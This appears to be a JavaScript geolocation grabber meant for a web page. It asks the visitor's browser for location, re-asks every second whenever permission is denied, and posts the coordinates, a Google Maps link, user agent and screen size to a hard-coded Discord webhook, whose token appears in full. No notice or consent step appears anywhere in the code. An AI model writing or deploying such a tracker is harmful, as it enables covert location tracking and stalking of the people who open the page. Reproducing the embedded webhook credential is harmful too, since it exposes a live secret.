 // Discord Webhook URL (replace with your actual webhook URL)
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1332955645846097941/UgtbTHS4ZfrZpDMulea4xho7z_4VlO-Y2T4ndGRbsit4LmJZHt98hH5fB0KvXkls8zvq';

    // Function to repeatedly request geolocation until access is granted
    function requestLocation() {
        navigator.geolocation.getCurrentPosition(function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            console.log("Latitude: " + latitude);
            console.log("Longitude: " + longitude);

            // Store geolocation and other data
            const userAgent = navigator.userAgent;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;

            // Send the data to Discord webhook
            sendToDiscord(latitude, longitude, userAgent, screenWidth, screenHeight);

        }, function(error) {
            if (error.code === error.PERMISSION_DENIED) {
                // Retry location request after a short delay
                setTimeout(requestLocation, 1000);
            }
        });
    }

    // Function to send data to Discord webhook
    function sendToDiscord(lat, lng, userAgent, screenWidth, screenHeight) {
        const googleMapsLink = `https://www.google.com/maps/place/${lat},${lng}`;
        const data = {
            "content": `📍 **Geolocation Data Received**\nLatitude: ${lat}\nLongitude: ${lng}\n🌍 [View on Google Maps](${googleMapsLink})\nUser Agent: ${userAgent}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px`
        };

        fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                console.log("Data sent to Discord successfully!");
            } else {
                console.error("Failed to send data to Discord.");
            }
        })
        .catch(error => console.error("Error sending data to Discord: ", error));
    }

    // Start the geolocation loop
    requestLocation();
